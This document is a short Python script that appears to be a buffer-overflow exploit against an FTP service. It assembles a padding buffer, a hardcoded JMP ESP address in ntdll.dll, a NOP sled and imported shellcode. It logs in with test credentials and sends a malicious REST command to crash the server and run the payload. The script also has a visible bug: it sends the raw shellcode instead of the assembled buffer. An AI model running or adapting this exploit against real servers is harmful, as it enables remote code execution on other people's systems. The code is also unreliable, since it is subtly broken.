#!/usr/bin/python

import errno
from os import strerror
from socket import *
import sys
from time import sleep
from struct import pack
from payload import buf
import socket
from ftplib import FTP

def shell_attack(target_machine, target_port):

	ip = target_machine
	port = target_port

	
	buffer = b"\x41" * 246
	buffer += pack(b'<L',0x7C91FCD8)#JMP ESP in ntdll.dll
	buffer += b"\x90" * 20
	buffer += buf
	

	sleep(1)
	try:
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect((target_machine, target_port))
	
		s.recv(2000)
		s.send(b"USER test\r\n")
		s.recv(2000)
		s.send(b"PASS test\r\n")
		s.recv(2000)
		s.send(b"REST "+buf+b"\r\n")
		s.close()
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect((target_machine, target_port))
		sleep(1)#Wait a segund
		s.close()#Close connection CRASH
		
	except:
		pass